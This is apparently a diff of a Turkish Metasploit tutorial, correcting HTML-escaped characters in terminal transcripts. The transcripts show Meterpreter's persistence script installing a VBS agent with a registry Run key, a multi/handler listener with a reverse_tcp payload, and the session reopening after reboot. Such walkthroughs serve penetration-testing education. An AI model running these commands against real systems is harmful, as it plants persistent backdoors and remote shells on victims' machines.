@@ -38,7 +38,7 @@ Hedef sistemde meterpreter oturum açtıktan sonra `persistence.rb` script kodun
 
 
 ```bash
-meterpreter **&gt;** run persistence -h
+meterpreter **>** run persistence -h
 
 **[!]** Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
 **[!]** Example: run post/windows/manage/persistence_exe OPTION**=**value **[**...]
@@ -81,7 +81,7 @@ Aşağıdaki `persistence -U -i 5 -p 443 -r 192.168.1.71` komutu hangi işlemler
 
 
 ```bash
-meterpreter **&gt;** run persistence -U -i 5 -p 443 -r 192.168.1.71
+meterpreter **>** run persistence -U -i 5 -p 443 -r 192.168.1.71
 **[*********]** Creating a persistent agent: LHOST**=**192.168.1.71 LPORT**=**443 **(**interval**=**5 onboot**=**true**)**
 **[*********]** Persistent agent script is 613976 bytes long
 **[*********]** Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
@@ -89,7 +89,7 @@ meterpreter **&gt;** run persistence -U -i 5 -p 443 -r 192.168.1.71
 **[*********]** Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
 **[*********]** Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
 **[*********]** For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -107,9 +107,9 @@ Scriptin çalışıp çalışmadığını ve otomatik bağlantı yapıp yapmadı
 
 
 ```bash
-meterpreter **&gt;** reboot
+meterpreter **>** reboot
 Rebooting...
-meterpreter **&gt;** exit
+meterpreter **>** exit
 
 **[*********]** Meterpreter session 3 closed.  Reason: User exit
 ```
@@ -120,14 +120,14 @@ Dinleyici `exploit/multi/handler` modülünü tekrar başlatalım.
 
 
 ```bash
-msf exploit**(**ms08_067_netapi**)** **&gt;** use exploit/multi/handler
-msf exploit**(**handler**)** **&gt;** set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD **=&gt;** windows/meterpreter/reverse_tcp
-msf exploit**(**handler**)** **&gt;** set LHOST 192.168.1.71
-LHOST **=&gt;** 192.168.1.71
-msf exploit**(**handler**)** **&gt;** set LPORT 443
-LPORT **=&gt;** 443
-msf exploit**(**handler**)** **&gt;** exploit
+msf exploit**(**ms08_067_netapi**)** **>** use exploit/multi/handler
+msf exploit**(**handler**)** **>** set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD **=>** windows/meterpreter/reverse_tcp
+msf exploit**(**handler**)** **>** set LHOST 192.168.1.71
+LHOST **=>** 192.168.1.71
+msf exploit**(**handler**)** **>** set LPORT 443
+LPORT **=>** 443
+msf exploit**(**handler**)** **>** exploit
 
 **[*********]** Started reverse handler on 192.168.1.71:443
 **[*********]** Starting the payload handler...
@@ -140,11 +140,11 @@ Hedef bilgisayar tekrar başladığında, oturum açılır açılmaz yerel bilgi
 
 ```bash
 **[*********]** Sending stage **(**748544 bytes**)** to 192.168.1.161
-**[*********]** Meterpreter session 5 opened **(**192.168.1.71:443 -&gt; 192.168.1.161:1045**)** at 2010-08-21 12:31:42 -0600
+**[*********]** Meterpreter session 5 opened **(**192.168.1.71:443 -> 192.168.1.161:1045**)** at 2010-08-21 12:31:42 -0600
 
-meterpreter **&gt;** sysinfo
+meterpreter **>** sysinfo
 Computer: XEN-XP-SP2-BARE
 OS      : Windows XP **(**Build 2600, Service Pack 2**)**.
 Arch    : x86
 Language: en_US
-meterpreter **&gt;**```
+meterpreter **>**```
